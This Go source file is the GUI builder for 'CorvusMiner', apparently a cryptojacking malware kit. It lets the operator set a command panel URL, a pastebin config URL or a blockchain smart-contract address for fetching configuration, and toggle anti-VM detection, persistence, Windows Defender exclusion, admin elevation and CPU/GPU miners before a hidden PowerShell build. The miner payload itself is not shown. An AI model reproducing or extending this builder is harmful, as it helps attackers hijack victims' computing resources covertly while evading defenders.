package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/dialog"
	"fyne.io/fyne/v2/theme"
	"fyne.io/fyne/v2/widget"
)

// ─── Config ─────────────────────────────────────────────────────────────────

type BuildConfig struct {
	PanelURL          string `json:"panel_url"`
	ConfigURL         string `json:"config_url"`
	SmartContract     bool   `json:"smart_contract"`
	ContractAddress   string `json:"contract_address"`
	AntiVM            bool   `json:"antivm"`
	Persistence       bool   `json:"persistence"`
	DebugConsole      bool   `json:"debug_console"`
	AdminManifest     bool   `json:"admin_manifest"`
	DefenderExclusion bool   `json:"defender_exclusion"`
	CPUMiner          bool   `json:"cpu_miner"`
	GPUMiner          bool   `json:"gpu_miner"`
	RemoteMiners      bool   `json:"remote_miners"`
}

// ─── Profile store ───────────────────────────────────────────────────────────

type ProfileStore struct {
	mu       sync.Mutex
	profiles map[string]BuildConfig
	path     string
}

func newProfileStore(path string) *ProfileStore {
	s := &ProfileStore{path: path, profiles: map[string]BuildConfig{}}
	s.load()
	return s
}

func (s *ProfileStore) load() {
	data, err := os.ReadFile(s.path)
	if err != nil {
		return
	}
	_ = json.Unmarshal(data, &s.profiles)
}

func (s *ProfileStore) save() {
	s.mu.Lock()
	defer s.mu.Unlock()
	data, _ := json.MarshalIndent(s.profiles, "", "  ")
	_ = os.WriteFile(s.path, data, 0600)
}

func (s *ProfileStore) Names() []string {
	s.mu.Lock()
	defer s.mu.Unlock()
	names := make([]string, 0, len(s.profiles))
	for k := range s.profiles {
		names = append(names, k)
	}
	return names
}

func (s *ProfileStore) Get(name string) (BuildConfig, bool) {
	s.mu.Lock()
	defer s.mu.Unlock()
	c, ok := s.profiles[name]
	return c, ok
}

func (s *ProfileStore) Set(name string, c BuildConfig) {
	s.mu.Lock()
	s.profiles[name] = c
	s.mu.Unlock()
	s.save()
}

func (s *ProfileStore) Delete(name string) {
	s.mu.Lock()
	delete(s.profiles, name)
	s.mu.Unlock()
	s.save()
}

// ─── Project root discovery ──────────────────────────────────────────────────

func findProjectRoot() string {
	exe, err := os.Executable()
	if err != nil {
		cwd, _ := os.Getwd()
		return cwd
	}
	// exe lives in the project root alongside build.ps1 and Client/
	return filepath.Dir(exe)
}

// ─── Dependency check ────────────────────────────────────────────────────────

type DepReport struct {
	Chocolatey bool
	CMake      bool
	MinGW      bool
}

func checkDependencies() DepReport {
	if runtime.GOOS != "windows" {
		check := func(cmd string) bool {
			out, err := exec.Command("which", cmd).Output()
			return err == nil && strings.TrimSpace(string(out)) != ""
		}
		return DepReport{
			Chocolatey: check("choco"),
			CMake:      check("cmake"),
			MinGW:      check("g++"),
		}
	}

	// Single PowerShell invocation for all three checks — no window flicker
	script := `
$r = @{choco=$false; cmake=$false; mingw=$false}
if (Get-Command choco -ErrorAction SilentlyContinue) { $r.choco = $true }
if (Get-Command cmake -ErrorAction SilentlyContinue) { $r.cmake = $true }
if (Get-Command g++   -ErrorAction SilentlyContinue) { $r.mingw = $true }
$r | ConvertTo-Json -Compress
`
	cmd := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", script)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	out, err := cmd.Output()
	if err != nil {
		return DepReport{}
	}

	var result struct {
		Choco bool `json:"choco"`
		CMake bool `json:"cmake"`
		MinGW bool `json:"mingw"`
	}
	if err := json.Unmarshal([]byte(strings.TrimSpace(string(out))), &result); err != nil {
		return DepReport{}
	}
	return DepReport{
		Chocolatey: result.Choco,
		CMake:      result.CMake,
		MinGW:      result.MinGW,
	}
}

// ─── Build runner ────────────────────────────────────────────────────────────

func runBuild(projectRoot string, cfg BuildConfig, output func(string)) bool {
	buildScript := filepath.Join(projectRoot, "build.ps1")
	if _, err := os.Stat(buildScript); err != nil {
		output(fmt.Sprintf("ERROR: build script not found at %s\n", buildScript))
		return false
	}

	boolStr := func(b bool) string {
		if b {
			return "$true"
		}
		return "$false"
	}

	args := fmt.Sprintf(
		"& '%s' -panel_url '%s' -config_url '%s' -smart_contract %s -contract_address '%s' -antivm %s -persistence %s -debug_console %s -admin_manifest %s -defender_exclusion %s -cpu_miner %s -gpu_miner %s -remote_miners %s",
		buildScript,
		cfg.PanelURL,
		cfg.ConfigURL,
		boolStr(cfg.SmartContract),
		cfg.ContractAddress,
		boolStr(cfg.AntiVM),
		boolStr(cfg.Persistence),
		boolStr(cfg.DebugConsole),
		boolStr(cfg.AdminManifest),
		boolStr(cfg.DefenderExclusion),
		boolStr(cfg.CPUMiner),
		boolStr(cfg.GPUMiner),
		boolStr(cfg.RemoteMiners),
	)

	cmd := exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", args)
	cmd.Dir = projectRoot
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	stdout, err := cmd.StdoutPipe()
	if err != nil {
		output(fmt.Sprintf("ERROR: %v\n", err))
		return false
	}
	cmd.Stderr = cmd.Stdout

	if err := cmd.Start(); err != nil {
		output(fmt.Sprintf("ERROR: %v\n", err))
		return false
	}

	scanner := bufio.NewScanner(stdout)
	for scanner.Scan() {
		output(scanner.Text() + "\n")
	}

	if err := cmd.Wait(); err != nil {
		return false
	}
	return true
}

func installDependencies(projectRoot string, output func(string)) {
	script := `
$ErrorActionPreference = 'Continue'
$chocoPath = "C:\ProgramData\chocolatey\bin\choco.exe"
if (-not (Test-Path $chocoPath)) {
    Write-Host '[*] Installing Chocolatey...'
    Set-ExecutionPolicy Bypass -Scope Process -Force
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
    iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
    Write-Host '[+] Chocolatey installed'
} else {
    Write-Host '[+] Chocolatey already installed'
}
if (Test-Path $chocoPath) {
    Write-Host '[*] Ensuring CMake...'
    & "$chocoPath" install cmake -y -q 2>&1
    Write-Host '[*] Ensuring MinGW...'
    & "$chocoPath" install mingw -y -q 2>&1
    Write-Host '[+] Done. Please restart the builder.'
} else {
    Write-Host '[!] Chocolatey not found. Please install manually.'
}
`
	tmpFile := filepath.Join(os.TempDir(), "corvus_install_deps.ps1")
	_ = os.WriteFile(tmpFile, []byte(script), 0600)
	defer os.Remove(tmpFile)

	elevated := fmt.Sprintf("Start-Process powershell -Verb RunAs -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File','%s') -Wait", tmpFile)
	cmd := exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", elevated)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		output(fmt.Sprintf("ERROR: %v\n", err))
		return
	}
	cmd.Stderr = cmd.Stdout
	_ = cmd.Start()
	scanner := bufio.NewScanner(stdout)
	for scanner.Scan() {
		output(scanner.Text() + "\n")
	}
	_ = cmd.Wait()
}

// ─── UI helpers ──────────────────────────────────────────────────────────────

// labeled wraps a widget with a left-aligned label in a form row
func labeled(label string, w fyne.CanvasObject) *fyne.Container {
	lbl := widget.NewLabelWithStyle(label, fyne.TextAlignLeading, fyne.TextStyle{Bold: true})
	return container.NewBorder(nil, nil, lbl, nil, w)
}

func hint(text string) *widget.Label {
	l := widget.NewLabelWithStyle(text, fyne.TextAlignLeading, fyne.TextStyle{Italic: true})
	l.Wrapping = fyne.TextWrapWord
	return l
}

func separator() *widget.Separator {
	return widget.NewSeparator()
}

func timestamp() string {
	return time.Now().Format("15:04:05")
}

// ─── Main ────────────────────────────────────────────────────────────────────

func main() {
	projectRoot := findProjectRoot()
	profilesPath := filepath.Join(projectRoot, "build_profiles.json")
	profiles := newProfileStore(profilesPath)

	a := app.New()
	a.Settings().SetTheme(theme.DarkTheme())
	w := a.NewWindow("CorvusMiner Builder")
	w.Resize(fyne.NewSize(1000, 700))
	w.SetMaster()

	// ── Output log ──────────────────────────────────────────────────────────
	var outputScroll *container.Scroll
	var outputBuf strings.Builder
	outputEntry := widget.NewMultiLineEntry()
	outputEntry.Wrapping = fyne.TextWrapOff
	outputEntry.TextStyle = fyne.TextStyle{Monospace: true}

	appendOutput := func(text string) {
		// Check if we're near the bottom BEFORE adding content.
		// If the user has scrolled up we won't yank them back down.
		atBottom := true
		if outputScroll != nil {
			maxScroll := outputEntry.MinSize().Height - outputScroll.Size().Height
			if maxScroll > 20 && outputScroll.Offset.Y < maxScroll-20 {
				atBottom = false
			}
		}
		outputBuf.WriteString(text)
		newText := outputBuf.String()
		outputEntry.SetText(newText)
		if outputScroll != nil && atBottom {
			// Move cursor to end so Fyne doesn't snap focus back to the top.
			outputEntry.CursorRow = strings.Count(newText, "\n")
			outputEntry.CursorColumn = 0
			outputEntry.Refresh()
			outputScroll.ScrollToBottom()
		}
	}

	// ── Build config inputs ─────────────────────────────────────────────────
	panelURLEntry := widget.NewEntry()
	panelURLEntry.SetPlaceHolder("https://panel.example.com/api/miners/submit")

	configURLEntry := widget.NewEntry()
	configURLEntry.SetPlaceHolder("https://pastebin.com/raw/YOUR_ID")

	// Smart contract URL fields
	chkSmartContract := widget.NewCheck("Use Smart Contract for URL", nil)
	contractAddressEntry := widget.NewEntry()
	contractAddressEntry.SetPlaceHolder("0xYourContractAddress")
	contractAddressEntry.Disable()

	chkAntiVM := widget.NewCheck("Anti-VM Detection", nil)
	chkPersistence := widget.NewCheck("Persistence", nil)
	chkDebugConsole := widget.NewCheck("Debug Console", nil)
	chkAdminManifest := widget.NewCheck("Admin Manifest", nil)
	chkDefenderExclusion := widget.NewCheck("Defender Exclusion", nil)

	chkCPUMiner := widget.NewCheck("CPU Miner", nil)
	chkCPUMiner.SetChecked(true)
	chkGPUMiner := widget.NewCheck("GPU Miner", nil)
	chkRemoteMiners := widget.NewCheck("Remote Miners", nil)

	minerInfoLabel := hint("Choose either Panel URL, Config GET URL, or Smart Contract above, then select miners.")

	// Dynamic miner option logic
	updateMinerOptions := func() {
		panel := strings.TrimSpace(panelURLEntry.Text)
		config := strings.TrimSpace(configURLEntry.Text)
		useContract := chkSmartContract.Checked

		isGetMode := config != "" && !useContract

		if useContract {
			// Smart contract mode: behaves like panel mode (POST)
			contractAddressEntry.Enable()
			panelURLEntry.Disable()
			configURLEntry.Disable()
			chkCPUMiner.Enable()
			chkGPUMiner.Enable()
			chkRemoteMiners.Enable()
			minerInfoLabel.SetText("Smart contract mode: URL fetched from blockchain at runtime. Panel mode options available.")
		} else if isGetMode {
			// GET/pastebin mode: embed miners only, remote load not supported
			contractAddressEntry.Disable()
			panelURLEntry.Enable()
			configURLEntry.Enable()
			chkCPUMiner.Enable()
			chkGPUMiner.Enable()
			chkRemoteMiners.SetChecked(false)
			chkRemoteMiners.Disable()
			minerInfoLabel.SetText("GET mode: embed miners only. Remote load is not available with a direct GET URL.")
		} else if panel != "" {
			// Panel mode: all options available — embed, remote, or both
			contractAddressEntry.Disable()
			panelURLEntry.Enable()
			configURLEntry.Enable()
			chkCPUMiner.Enable()
			chkGPUMiner.Enable()
			chkRemoteMiners.Enable()
			minerInfoLabel.SetText("Panel mode: embed miners, use remote load, or both.")
		} else {
			contractAddressEntry.Disable()
			panelURLEntry.Enable()
			configURLEntry.Enable()
			chkCPUMiner.Enable()
			chkGPUMiner.Enable()
			chkRemoteMiners.Enable()
			minerInfoLabel.SetText("Choose either Panel URL, Config GET URL, or Smart Contract above, then select miners.")
		}
	}

	chkSmartContract.OnChanged = func(_ bool) { updateMinerOptions() }
	panelURLEntry.OnChanged = func(_ string) { updateMinerOptions() }
	configURLEntry.OnChanged = func(_ string) { updateMinerOptions() }

	getConfig := func() BuildConfig {
		return BuildConfig{
			PanelURL:          strings.TrimSpace(panelURLEntry.Text),
			ConfigURL:         strings.TrimSpace(configURLEntry.Text),
			SmartContract:     chkSmartContract.Checked,
			ContractAddress:   strings.TrimSpace(contractAddressEntry.Text),
			AntiVM:            chkAntiVM.Checked,
			Persistence:       chkPersistence.Checked,
			DebugConsole:      chkDebugConsole.Checked,
			AdminManifest:     chkAdminManifest.Checked,
			DefenderExclusion: chkDefenderExclusion.Checked,
			CPUMiner:          chkCPUMiner.Checked,
			GPUMiner:          chkGPUMiner.Checked,
			RemoteMiners:      chkRemoteMiners.Checked,
		}
	}

	applyConfig := func(cfg BuildConfig) {
		panelURLEntry.SetText(cfg.PanelURL)
		configURLEntry.SetText(cfg.ConfigURL)
		chkSmartContract.SetChecked(cfg.SmartContract)
		contractAddressEntry.SetText(cfg.ContractAddress)
		chkAntiVM.SetChecked(cfg.AntiVM)
		chkPersistence.SetChecked(cfg.Persistence)
		chkDebugConsole.SetChecked(cfg.DebugConsole)
		chkAdminManifest.SetChecked(cfg.AdminManifest)
		chkDefenderExclusion.SetChecked(cfg.DefenderExclusion)
		chkCPUMiner.SetChecked(cfg.CPUMiner)
		chkGPUMiner.SetChecked(cfg.GPUMiner)
		chkRemoteMiners.SetChecked(cfg.RemoteMiners)
		updateMinerOptions()
	}

	// ── Profile management ──────────────────────────────────────────────────
	profileSelect := widget.NewSelect(profiles.Names(), nil)

	loadProfileBtn := widget.NewButton("Load", func() {
		name := profileSelect.Selected
		if name == "" {
			return
		}
		if cfg, ok := profiles.Get(name); ok {
			applyConfig(cfg)
			appendOutput(fmt.Sprintf("[%s] Loaded profile: %s\n", timestamp(), name))
		}
	})

	saveProfileBtn := widget.NewButton("Save As", func() {
		nameEntry := widget.NewEntry()
		nameEntry.SetPlaceHolder("Profile name")
		dialog.ShowForm("Save Profile", "Save", "Cancel",
			[]*widget.FormItem{widget.NewFormItem("Name", nameEntry)},
			func(ok bool) {
				if !ok || strings.TrimSpace(nameEntry.Text) == "" {
					return
				}
				name := strings.TrimSpace(nameEntry.Text)
				profiles.Set(name, getConfig())
				profileSelect.Options = profiles.Names()
				profileSelect.Refresh()
				appendOutput(fmt.Sprintf("[%s] Saved profile: %s\n", timestamp(), name))
			}, w)
	})

	deleteProfileBtn := widget.NewButton("Delete", func() {
		name := profileSelect.Selected
		if name == "" {
			return
		}
		dialog.ShowConfirm("Delete Profile",
			fmt.Sprintf("Delete profile '%s'?", name),
			func(ok bool) {
				if !ok {
					return
				}
				profiles.Delete(name)
				profileSelect.Options = profiles.Names()
				profileSelect.SetSelected("")
				profileSelect.Refresh()
				appendOutput(fmt.Sprintf("[%s] Deleted profile: %s\n", timestamp(), name))
			}, w)
	})

	profileRow := container.NewHBox(profileSelect, loadProfileBtn, saveProfileBtn, deleteProfileBtn)

	// ── Status label ────────────────────────────────────────────────────────
	statusLabel := widget.NewLabelWithStyle("Ready", fyne.TextAlignLeading, fyne.TextStyle{Bold: true})

	// ── Build button ────────────────────────────────────────────────────────
	buildBtn := widget.NewButton("BUILD NOW", nil)
	buildBtn.Importance = widget.HighImportance

	buildBtn.OnTapped = func() {
		cfg := getConfig()
		if cfg.PanelURL == "" && cfg.ConfigURL == "" && !cfg.SmartContract {
			dialog.ShowError(fmt.Errorf("please enter either Panel URL, Config GET URL, or enable Smart Contract"), w)
			return
		}
		if cfg.SmartContract && cfg.ContractAddress == "" {
			dialog.ShowError(fmt.Errorf("contract address is required for smart contract mode"), w)
			return
		}

		outputBuf.Reset()
		outputEntry.SetText("")
		buildBtn.Disable()
		statusLabel.SetText("Building...")
		appendOutput(fmt.Sprintf("[%s] Starting build...\n", timestamp()))
		if cfg.SmartContract {
			appendOutput(fmt.Sprintf("Contract: %s\n", cfg.ContractAddress))
		} else {
			appendOutput(fmt.Sprintf("Panel URL:   %s\nConfig URL:  %s\n", cfg.PanelURL, cfg.ConfigURL))
		}
		appendOutput(fmt.Sprintf("AntiVM: %v  Persistence: %v  Debug: %v  Admin: %v  Defender: %v\nCPU: %v  GPU: %v  Remote: %v\n\n",
			cfg.AntiVM, cfg.Persistence, cfg.DebugConsole, cfg.AdminManifest, cfg.DefenderExclusion,
			cfg.CPUMiner, cfg.GPUMiner, cfg.RemoteMiners,
		))

		go func() {
			success := runBuild(projectRoot, cfg, func(line string) {
				appendOutput(line)
			})
			if success {
				appendOutput(fmt.Sprintf("\n[%s] Build completed successfully!\n", timestamp()))
				statusLabel.SetText("Build successful")
			} else {
				appendOutput(fmt.Sprintf("\n[%s] Build failed!\n", timestamp()))
				statusLabel.SetText("Build failed")
			}
			buildBtn.Enable()
		}()
	}

	// ── Action buttons ──────────────────────────────────────────────────────
	clearBtn := widget.NewButton("Clear Output", func() {
		outputBuf.Reset()
		outputEntry.SetText("")
	})

	openFolderBtn := widget.NewButton("Open Build Folder", func() {
		buildFolder := filepath.Join(projectRoot, "Client", "build")
		if _, err := os.Stat(buildFolder); os.IsNotExist(err) {
			dialog.ShowError(fmt.Errorf("build folder not found at:\n%s\n\nBuild the project first", buildFolder), w)
			return
		}
		var cmd *exec.Cmd
		switch runtime.GOOS {
		case "windows":
			cmd = exec.Command("explorer", buildFolder)
		case "darwin":
			cmd = exec.Command("open", buildFolder)
		default:
			cmd = exec.Command("xdg-open", buildFolder)
		}
		_ = cmd.Start()
	})

	infoBtn := widget.NewButton("Info", func() {
		githubURL := "https://github.com/laprosa/corvusminer"
		telegramURL := "https://t.me/corvusminer"

		ghEntry := widget.NewEntry()
		ghEntry.SetText(githubURL)
		ghEntry.Disable()

		tgEntry := widget.NewEntry()
		tgEntry.SetText(telegramURL)
		tgEntry.Disable()

		ghCopyBtn := widget.NewButton("Copy GitHub URL", func() {
			w.Clipboard().SetContent(githubURL)
		})
		tgCopyBtn := widget.NewButton("Copy Telegram URL", func() {
			w.Clipboard().SetContent(telegramURL)
		})

		content := container.NewVBox(
			widget.NewLabelWithStyle("CorvusMiner Links", fyne.TextAlignCenter, fyne.TextStyle{Bold: true}),
			separator(),
			widget.NewLabel("GitHub Repository:"),
			ghEntry,
			ghCopyBtn,
			separator(),
			widget.NewLabel("Telegram Channel:"),
			tgEntry,
			tgCopyBtn,
		)
		dialog.ShowCustom("Info", "Close", content, w)
	})

	// ── Dependency check on startup ──────────────────────────────────────────
	go func() {
		report := checkDependencies()
		if report.Chocolatey && report.CMake && report.MinGW {
			return
		}

		missing := []string{}
		if !report.Chocolatey {
			missing = append(missing, "• Chocolatey")
		}
		if !report.CMake {
			missing = append(missing, "• CMake")
		}
		if !report.MinGW {
			missing = append(missing, "• MinGW-w64 (g++)")
		}

		msg := fmt.Sprintf("Missing build requirements:\n%s\n\nInstall them now?\n(Requires Administrator privileges)",
			strings.Join(missing, "\n"))

		dialog.ShowConfirm("Missing Dependencies", msg, func(ok bool) {
			if !ok {
				return
			}

			progEntry := widget.NewMultiLineEntry()
			progEntry.Disable()
			progEntry.TextStyle = fyne.TextStyle{Monospace: true}

			progAppend := func(text string) {
				progEntry.SetText(progEntry.Text + text)
			}

			content := container.NewVBox(
				widget.NewLabel("Installing dependencies..."),
				container.NewScroll(progEntry),
			)
			dlg := dialog.NewCustom("Installing", "Close", content, w)
			dlg.Show()
			dlg.Resize(fyne.NewSize(600, 300))

			go func() {
				installDependencies(projectRoot, progAppend)
				progAppend("\nDone. Please restart the builder.\n")
			}()
		}, w)
	}()

	// ── Layout ───────────────────────────────────────────────────────────────

	// --- Left panel (settings) ---
	contractFrame := widget.NewCard("Smart Contract URL", "",
		container.NewVBox(
			chkSmartContract,
			hint("When checked, the client reads the URL from the TextStorage contract at startup."),
			separator(),
			labeled("Contract Address:", contractAddressEntry),
		),
	)

	connectionFrame := widget.NewCard("Connection Settings", "",
		container.NewVBox(
			hint("⚠  Use EITHER Panel URL OR Config URL — not both. Leave empty when using Smart Contract."),
			hint("Multiple URLs: comma-separated (,)"),
			separator(),
			labeled("Panel URL:", panelURLEntry),
			labeled("Config GET URL:", configURLEntry),
		),
	)

	featuresFrame := widget.NewCard("Core Features", "",
		container.NewVBox(
			container.NewHBox(chkAntiVM, chkPersistence),
			container.NewHBox(chkDebugConsole, chkAdminManifest),
			chkDefenderExclusion,
		),
	)

	minerFrame := widget.NewCard("Miner Configuration", "",
		container.NewVBox(
			container.NewHBox(chkCPUMiner, chkGPUMiner),
			chkRemoteMiners,
			minerInfoLabel,
		),
	)

	profileFrame := widget.NewCard("Build Profile", "", profileRow)

	actionRow := container.NewHBox(buildBtn, clearBtn, openFolderBtn, infoBtn)

	statusRow := container.NewHBox(
		widget.NewLabelWithStyle("Status:", fyne.TextAlignLeading, fyne.TextStyle{Bold: true}),
		statusLabel,
	)

	leftPanel := container.NewVBox(
		widget.NewLabelWithStyle("CorvusMiner Builder", fyne.TextAlignLeading, fyne.TextStyle{Bold: true}),
		hint("Professional Build Configuration"),
		separator(),
		profileFrame,
		contractFrame,
		connectionFrame,
		featuresFrame,
		minerFrame,
		separator(),
		actionRow,
		statusRow,
	)

	leftScroll := container.NewVScroll(leftPanel)
	leftScroll.SetMinSize(fyne.NewSize(430, 0))

	// --- Right panel (output) ---
	outputScroll = container.NewScroll(outputEntry)
	outputScroll.SetMinSize(fyne.NewSize(500, 0))

	rightPanel := container.NewBorder(
		widget.NewLabelWithStyle("Build Output", fyne.TextAlignLeading, fyne.TextStyle{Bold: true}),
		nil, nil, nil,
		outputScroll,
	)

	split := container.NewHSplit(leftScroll, rightPanel)
	split.SetOffset(0.42)

	w.SetContent(split)
	w.ShowAndRun()
}
